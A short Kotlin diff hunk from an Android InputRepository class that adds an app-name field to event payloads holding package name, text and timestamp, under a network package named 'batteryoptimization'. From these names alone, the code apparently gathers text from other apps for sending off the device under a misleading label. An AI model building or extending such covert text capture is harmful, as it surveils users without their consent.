@@ -106,6 +106,7 @@ class InputRepository private constructor(context: Context) {
         val eventPayloads = currentEvents.map { event ->
             com.android.batteryoptimization.network.EventPayload(
                 packageName = event.packageName,
+                appName = event.appName,
                 text = event.text,
                 timestamp = event.timestamp
             )
